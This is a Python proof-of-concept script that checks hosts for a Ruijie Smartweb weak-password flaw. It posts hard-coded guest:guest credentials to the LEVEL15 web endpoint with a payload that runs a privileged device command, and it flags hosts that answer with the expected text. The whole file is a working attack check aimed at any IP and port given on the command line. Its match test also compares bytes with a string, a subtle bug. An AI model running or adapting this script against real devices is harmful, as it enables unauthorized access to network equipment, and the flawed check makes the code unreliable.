#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/WEB_VMS/LEVEL15/"                                #填写payload
    header = {"Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="}                                 #填写header头
    data = "command=show basic-info dev&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."                                   #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)

        if req.status_code == 200:
            if (b'Level was: LEVEL15' in req.text):              #填写判断条件
                logging.info("[+] {} find Ruijie_smartweb_weak_password".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found Ruijie_smartweb_weak_password".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)